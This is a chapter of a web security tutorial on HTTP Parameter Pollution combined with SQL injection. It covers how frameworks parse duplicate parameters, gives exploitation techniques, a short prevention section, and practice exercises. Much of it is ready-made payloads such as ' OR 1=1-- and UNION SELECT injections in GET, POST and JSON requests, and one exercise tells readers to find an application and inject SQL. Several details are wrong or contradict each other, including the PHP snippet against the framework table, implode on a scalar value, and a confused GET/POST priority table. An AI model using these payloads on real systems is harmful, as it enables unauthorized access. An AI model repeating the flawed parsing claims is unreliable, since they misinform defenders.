# 14 - HTTP Parameter Pollution

## Overview

HTTP Parameter Pollution (HPP) exploits how different frameworks and servers handle duplicate parameters in HTTP requests. By submitting multiple parameters with the same name, attackers can bypass validation or manipulate application logic, often leading to SQL injection vulnerabilities.

## Understanding HPP

HTTP Parameter Pollution occurs when an attacker submits multiple HTTP parameters with the same name. Different frameworks handle these duplicates in different ways, creating opportunities for injection attacks.

### How HPP Works

```
Normal Request:
GET /search?user=admin&filter=active

HPP Attack:
GET /search?user=admin&user=' OR 1=1--&filter=active
```

### Backend Behavior by Technology

| Framework         | Behavior         | Injection Result                 |
| ----------------- | ---------------- | -------------------------------- |
| **PHP/Apache**    | Last value wins  | `user = ' OR 1=1--`              |
| **ASP.NET/IIS**   | Comma-separated  | `user = admin,' OR 1=1--`        |
| **JSP/Tomcat**    | First value wins | `user = admin`                   |
| **Python/Django** | List of values   | `user = ['admin', "' OR 1=1--"]` |

## HPP + SQL Injection Attack

### Scenario: Validation Bypass

When applications validate one parameter occurrence but use another in the SQL query:

**Attack Flow:**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&username=' OR 1=1--&password=anything
```

**Validation Logic (Vulnerable):**

```php
// Only validates first occurrence
$username = $_GET['username']; // Gets 'admin'
// But some frameworks concatenate or use last value in query
```

**Backend Query Construction:**

```php
// Some implementations build query like:
$query = "SELECT * FROM users WHERE username = '" . implode(',', $_GET['username']) . "'";
// Results in: SELECT * FROM users WHERE username = 'admin,' OR 1=1--'
```

## HPP Variants

### Variant 1: GET + POST Pollution

```
GET: /search?user=safe
POST: user=' OR 1=1--

Result: Framework may prioritize POST over GET or vice versa
```

**Common Framework Behavior:**

| Framework  | GET Priority | POST Priority |
| ---------- | ------------ | ------------- |
| PHP        | $\_GET       | $\_POST       |
| Django     | request.GET  | request.POST  |
| Express.js | req.query    | req.body      |

### Variant 2: JSON + Parameter Pollution

```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "filter": "active",
  "filter": "' OR 1=1--"
}
```

Some JSON parsers use the last value, others create arrays.

### Variant 3: Array Parameter Injection

```
GET /search?user[]=admin&user[]=' OR 1=1--

Some frameworks: user = admin,' OR 1=1--
```

## Detection and Testing

### Step 1: Identify Parameter Handling

```http
# Test duplicate parameters
GET /test?id=1&id=2

# Check which value is used in response/query
```

**Testing Strategy:**

1. Send duplicate parameters with different values
2. Observe which value appears in response
3. Identify framework-specific behavior
4. Test with special characters to detect concatenation

### Step 2: Combine with SQL Injection

```http
GET /search?user=admin&user=' UNION SELECT * FROM admin--
```

### Step 3: Test Different Content-Types

```http
# Form data with duplicates
Content-Type: application/x-www-form-urlencoded
user=admin&user=' OR 1=1--

# JSON with duplicates
Content-Type: application/json
{"user": "admin", "user": "' OR 1=1--"}
```

## Exploitation Techniques

### Technique 1: Validation Bypass

```http
POST /register HTTP/1.1

username=john&username=admin'--&email=john@test.com
```

**How it works:**

- Validation checks `username=john` (clean)
- Query uses `username=admin'--` (injected)

### Technique 2: Logic Bypass

```http
GET /admin?role=user&role=admin
```

Some frameworks concatenate:

```sql
WHERE role = 'user,admin'
```

### Technique 3: SQL Injection via Concatenation

When frameworks concatenate duplicate parameters:

```http
POST /login

id=1&id=' OR 1=1--
```

**Result:**

```sql
SELECT * FROM users WHERE id = '1,' OR 1=1--'
```

## Prevention

### Input Normalization

```python
def get_single_param(params, name):
    """Always use first or last consistently"""
    value = params.get(name)
    if isinstance(value, list):
        return value[0]  # Consistently use first
    return value
```

### Validate Before Concatenation

```php
if (is_array($_GET['user'])) {
    die("Invalid parameter format");
}
```

### Strict Parameter Parsing

```javascript
// Express.js: Disable extended parsing
app.use(express.urlencoded({ extended: false }));

// Django: Use strict parsing
request.GET.get('user')  # Returns single value
```

## Practice Exercises

### Exercise 1: Framework Detection

Test duplicate parameters against different frameworks and document their behavior.

**Test Payload:**

```
GET /test?param=value1&param=value2
```

### Exercise 2: HPP + SQL Injection

Find an application that uses HPP-vulnerable parameter handling and inject SQL via the second parameter.

**Target:**

```http
POST /login
username=admin&username=' OR 1=1--
```

### Exercise 3: Array Parameter Injection

Test applications that accept array-style parameters:

```
GET /search?filter[]=active&filter[]=' UNION SELECT * FROM admin--
```

## Key Takeaways

1. **HPP exploits framework-specific parameter handling**
2. **Different technologies = different vulnerabilities**
3. **Validation often only checks first occurrence**
4. **Concatenation can create injection opportunities**
5. **Consistent parameter handling prevents HPP**

## Next Steps

Continue to [15 - Heavy Query DoS](15-Heavy-Query-DoS.md) to learn about resource exhaustion attacks.
